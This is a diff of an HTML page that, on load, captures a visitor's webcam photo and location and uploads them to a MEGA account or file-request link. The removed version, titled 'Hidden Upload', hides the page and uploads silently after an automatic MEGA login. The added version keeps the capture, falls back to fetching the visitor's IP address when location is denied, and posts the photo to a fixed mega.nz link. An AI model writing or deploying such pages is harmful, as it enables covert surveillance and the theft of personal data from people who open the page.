@@ -1,120 +1,136 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hidden Upload</title>
-    <script src="https://cdn.jsdelivr.net/npm/megaio/mega.js"></script>
-    <style>
-        body { display: none; } /* Hide the webpage */
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Automated Photo & Location Capture</title>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      background-color: #121212;
+      color: #ffffff;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      background-color: #1e1e1e;
+      padding: 2rem;
+      border-radius: 10px;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+      text-align: center;
+    }
+    video, canvas {
+      display: none;
+    }
+  </style>
 </head>
 <body>
-    <canvas id="canvas" style="display: none;"></canvas>
+  <div class="container">
+    <h1>Automated Capture</h1>
+    <p id="status">Initializing...</p>
+  </div>
 
-    <script>
-        let megaSession = null;
+  <script>
+    const video = document.createElement('video');
+    const canvas = document.createElement('canvas');
+    const statusText = document.getElementById('status');
 
-        // Auto-login to MEGA
-        function autoAuthenticateMega() {
-            const megaEmail = "your-email@example.com";
-            const megaPassword = "your-password";
+    let photoData = null;
+    let locationData = null;
 
-            const mega = new Mega();
-            mega.login(megaEmail, megaPassword)
-                .then(session => {
-                    megaSession = session;
-                    startProcess();
-                })
-                .catch(error => {});
+    async function initialize() {
+      statusText.textContent = 'Starting camera...';
+      await startCamera();
+      statusText.textContent = 'Capturing photo...';
+      await capturePhoto();
+      statusText.textContent = 'Fetching location...';
+      await getLocation();
+      statusText.textContent = 'Uploading to MEGA...';
+      saveData();
+    }
+
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        video.play();
+        await new Promise(resolve => setTimeout(resolve, 1000));
+      } catch (err) {
+        statusText.textContent = 'Camera access denied!';
+        throw new Error('Camera access denied');
+      }
+    }
+
+    async function capturePhoto() {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+      photoData = canvas.toDataURL('image/png');
+    }
+
+    async function getLocation() {
+      if (navigator.geolocation) {
+        try {
+          const position = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject);
+          });
+          locationData = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
+        } catch (err) {
+          statusText.textContent = 'Location permission denied. Fetching IP address...';
+          await fetchIP();
         }
+      } else {
+        statusText.textContent = 'Geolocation not supported. Fetching IP address...';
+        await fetchIP();
+      }
+    }
 
-        // Capture GPS and Camera Data Automatically
-        function startProcess() {
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    const lat = position.coords.latitude;
-                    const lng = position.coords.longitude;
-                    const loc = `Latitude: ${lat}, Longitude: ${lng}`;
-                    capturePhoto(loc);
-                },
-                (error) => {
-                    alert("Error with GPS: " + error.message);
-                },
-                { enableHighAccuracy: true, maximumAge: 0 }
-            );
+    async function fetchIP() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        locationData = `IP Address: ${data.ip}`;
+      } catch (err) {
+        statusText.textContent = 'Failed to fetch IP address.';
+        throw new Error('Failed to fetch IP address');
+      }
+    }
+
+    async function uploadToMega(fileBlob) {
+      const formData = new FormData();
+      formData.append('file', fileBlob, 'photo.png');
+
+      try {
+        const response = await fetch('https://mega.nz/filerequest/HVX6VRQXnCI', {
+          method: 'POST',
+          body: formData
+        });
+
+        if (response.ok) {
+          statusText.textContent = 'Upload successful!';
+        } else {
+          statusText.textContent = 'Upload failed!';
         }
+      } catch (error) {
+        console.error('Upload error:', error);
+        statusText.textContent = 'Error uploading file.';
+      }
+    }
 
-        // Capture a hidden photo
-        async function capturePhoto(location) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement("video");
-                video.srcObject = stream;
+    function saveData() {
+      console.log('Photo Data:', photoData);
+      console.log('Location Data:', locationData);
 
-                // Ensure video is playing and metadata is loaded
-                video.onloadedmetadata = () => {
-                    video.play();
+      fetch(photoData)
+        .then(res => res.blob())
+        .then(blob => uploadToMega(blob));
+    }
 
-                    // Wait for video to actually start playing before capturing
-                    video.onplaying = () => {
-                        const canvas = document.getElementById("canvas");
-                        const ctx = canvas.getContext("2d");
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-
-                        // Capture the image from video
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                        // Stop all media tracks after capturing
-                        stream.getTracks().forEach(track => track.stop());
-
-                        // Notify the user that the photo has been captured
-                        alert("Photo successfully captured!");
-
-                        // Upload photo to MEGA
-                        uploadToMega(canvas, location);
-                    };
-                };
-
-                video.onerror = (e) => {
-                    alert("Error with video capture: " + e.message);
-                    stream.getTracks().forEach(track => track.stop());
-                };
-            } catch (error) {
-                alert("Error accessing camera: " + error.message);
-            }
-        }
-
-        // Upload files silently
-        function uploadToMega(canvas, location) {
-            if (!megaSession) {
-                autoAuthenticateMega();
-                return;
-            }
-
-            const imageDataUrl = canvas.toDataURL("image/jpeg");
-            const imageBlob = dataURLtoBlob(imageDataUrl);
-            const locationBlob = new Blob([location], { type: 'text/plain' });
-
-            const mega = new Mega({ session: megaSession });
-
-            mega.upload("photo.jpg", imageBlob)
-                .then(() => mega.upload("location.txt", locationBlob))
-                .catch((error) => {
-                    alert("Error uploading to MEGA: " + error.message);
-                });
-        }
-
-        function dataURLtoBlob(dataurl) {
-            const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1];
-            const bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
-            for (let i = 0; i < n; i++) u8arr[i] = bstr.charCodeAt(i);
-            return new Blob([u8arr], { type: mime });
-        }
-
-        // Automatically start in the background
-        window.onload = () => { autoAuthenticateMega(); };
-    </script>
+    initialize();
+  </script>
 </body>
 </html>
